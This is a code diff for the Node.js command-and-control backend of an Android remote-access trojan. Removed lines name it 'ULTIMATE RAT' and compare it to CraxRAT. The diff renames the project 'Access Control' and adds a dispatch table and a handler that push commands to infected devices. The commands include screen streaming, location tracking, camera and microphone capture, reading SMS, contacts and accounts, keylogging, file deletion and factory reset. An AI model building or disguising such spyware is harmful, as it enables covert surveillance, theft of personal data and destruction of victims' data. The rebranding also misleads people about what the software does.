@@ -1,6 +1,6 @@
 // ============================================
-// ULTIMATE RAT BACKEND - COMPLETE WORKING CODE
-// CraxRAT + G700 BTMOB Level
+// ULTIMATE ACCESS CONTROL BACKEND - COMPLETE WORKING CODE
+// Advanced Remote Device Management Level
 // ============================================
 
 const express = require('express');
@@ -26,7 +26,7 @@ const fs = require('fs');
 
 const config = {
     PORT: process.env.PORT || 5000,
-    MONGODB_URI: process.env.MONGODB_URI || 'mongodb://localhost:27017/ultimate-rat',
+    MONGODB_URI: process.env.MONGODB_URI || 'mongodb://localhost:27017/ultimate-access-control',
     REDIS_URL: process.env.REDIS_URL,
     REDIS_HOST: process.env.REDIS_HOST || 'localhost',
     REDIS_PORT: process.env.REDIS_PORT || 6379,
@@ -685,8 +685,125 @@ app.get('/api/health', (req, res) => {
 
 io.use(authenticateSocket);
 
+// ============================================
+// COMMAND DISPATCH TABLE
+// ============================================
+const COMMAND_TYPES = {
+    // Screen
+    capture_screen: 'screen',
+    start_stream: 'screen',
+    stop_stream: 'screen',
+    // Location
+    get_location: 'location',
+    start_location_tracking: 'location',
+    stop_location_tracking: 'location',
+    // Camera
+    capture_photo: 'camera',
+    record_video: 'camera',
+    // Microphone
+    start_audio_recording: 'audio',
+    stop_audio_recording: 'audio',
+    // SMS / Calls
+    send_sms: 'sms',
+    get_sms: 'sms',
+    make_call: 'call',
+    get_call_logs: 'call',
+    // Files
+    list_files: 'files',
+    download_file: 'files',
+    delete_file: 'files',
+    // Device control
+    vibrate: 'control',
+    flash: 'control',
+    toast: 'control',
+    notification: 'control',
+    volume_up: 'control',
+    volume_down: 'control',
+    wifi_on: 'control',
+    wifi_off: 'control',
+    bluetooth_on: 'control',
+    bluetooth_off: 'control',
+    lock_screen: 'control',
+    restart: 'control',
+    // Data
+    get_contacts: 'data',
+    get_apps: 'data',
+    get_accounts: 'data',
+    clipboard: 'data',
+    device_info: 'data',
+    installed_apps: 'data',
+    uninstall_app: 'data',
+    factory_reset: 'data',
+    keylog: 'data'
+};
+
 io.on('connection', async (socket) => {
     logger.info(`Socket connected: ${socket.id} (User: ${socket.userId})`);
+
+    // Dashboard client joins user room on connect
+    socket.join(`user:${socket.userId}`);
+
+    // Send current device list to newly connected dashboard
+    const userDevices = await Device.find({ userId: socket.userId }).catch(() => []);
+    socket.emit('device:list', userDevices);
+
+    // Dashboard: request current device list
+    socket.on('dashboard:get_devices', async () => {
+        try {
+            const devices = await Device.find({ userId: socket.userId });
+            socket.emit('device:list', devices);
+        } catch (error) {
+            logger.error('Get devices socket error:', error);
+        }
+    });
+
+    // Dashboard: send command to a device
+    socket.on('command:send', async (data) => {
+        try {
+            const { deviceId, command, payload } = data;
+
+            const device = await Device.findOne({ deviceId, userId: socket.userId });
+            if (!device) {
+                return socket.emit('command:error', { message: 'Device not found or not authorized' });
+            }
+
+            const commandId = crypto.randomBytes(16).toString('hex');
+            const cmd = new Command({
+                commandId,
+                deviceId,
+                userId: socket.userId,
+                command,
+                data: payload || null,
+                status: 'pending'
+            });
+            await cmd.save();
+
+            const category = COMMAND_TYPES[command] || 'other';
+
+            if (device.status && device.status.online && device.status.socketId) {
+                io.to(device.status.socketId).emit('command:execute', {
+                    commandId,
+                    command,
+                    category,
+                    data: payload || null
+                });
+                cmd.status = 'executing';
+                cmd.executedAt = new Date();
+                await cmd.save();
+
+                socket.emit('command:sent', { commandId, command, status: 'executing', deviceId });
+                logger.info(`[command:send] ${command} → device ${deviceId}`);
+            } else {
+                cmd.status = 'failed';
+                cmd.error = 'Device offline';
+                await cmd.save();
+                socket.emit('command:error', { message: 'Device is offline', commandId });
+            }
+        } catch (error) {
+            logger.error('command:send error:', error);
+            socket.emit('command:error', { message: 'Failed to send command' });
+        }
+    });
 
     // Device Registration
     socket.on('device:register', async (data) => {
@@ -736,6 +853,10 @@ io.on('connection', async (socket) => {
                 deviceId,
                 message: 'Device registered successfully'
             });
+
+            // Broadcast updated device list to all dashboard clients for this user
+            const updatedDevices = await Device.find({ userId: socket.userId });
+            io.to(`user:${socket.userId}`).emit('device:list', updatedDevices);
         } catch (error) {
             logger.error('Device registration error:', error);
             socket.emit('error', { message: 'Device registration failed' });
@@ -890,7 +1011,6 @@ io.on('connection', async (socket) => {
     // Disconnect
     socket.on('disconnect', async () => {
         try {
-            // Update device status
             await Device.updateMany(
                 { 'status.socketId': socket.id },
                 { 
@@ -900,6 +1020,10 @@ io.on('connection', async (socket) => {
                     }
                 }
             );
+
+            // Broadcast updated list so dashboards refresh
+            const updatedDevices = await Device.find({ userId: socket.userId });
+            io.to(`user:${socket.userId}`).emit('device:list', updatedDevices);
 
             logger.info(`Socket disconnected: ${socket.id}`);
         } catch (error) {
@@ -932,7 +1056,7 @@ server.listen(config.PORT, () => {
     logger.info(`🚀 Server running on port ${config.PORT}`);
     logger.info(`📱 Device endpoint: http://localhost:${config.PORT}`);
     logger.info(`💻 Admin panel: http://localhost:${config.PORT}`);
-    logger.info(`🔥 ULTIMATE RAT - CraxRAT + G700 BTMOB Level`);
+    logger.info(`🔥 ULTIMATE ACCESS CONTROL SYSTEM - Advanced Device Management`);
 });
 
 // ============================================
